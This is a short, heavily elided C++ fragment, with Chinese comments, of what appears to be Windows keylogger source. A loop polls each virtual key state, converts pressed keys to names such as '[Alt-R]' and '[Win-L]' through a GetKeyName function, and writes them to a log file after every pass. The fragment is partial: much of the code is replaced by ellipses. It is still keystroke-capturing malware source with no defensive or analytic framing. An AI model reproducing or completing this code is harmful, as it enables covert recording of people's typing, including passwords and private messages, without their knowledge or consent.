...
int main()
{
	...
	while (true)
	{
		...
		for (int i = 8; i <= 255; i++)
		{
			if (curState[i] & 0x1 == 0x1)               //判断虚拟按键是否按下，无论是一直按着还是按一下就弹起，只判断是否按过
			{
				KeyName = GetKeyName(i);                        //写完一次就保存一次
				sprintf(tmp, "%s", KeyName.c_str());
				resultFileStream.write(tmp, strlen(tmp));
			}
		}
		resultFileStream.close();                                //写完一次就保存一次
		//重置lastIsdown数组
		for (int i = 8; i <= 255; i++)
		{
...
string GetKeyName(int NumKey)
{
	...
	if (NumKey == VK_ESCAPE) // 退出
		...
		revalue = "[Alt-L]";
	else if (NumKey == VK_RMENU) // 右换档键
		revalue = "[Alt-R]";
	else if (NumKey == VK_LWIN) // 左 WINDOWS 键
		revalue = "[Win-L]";
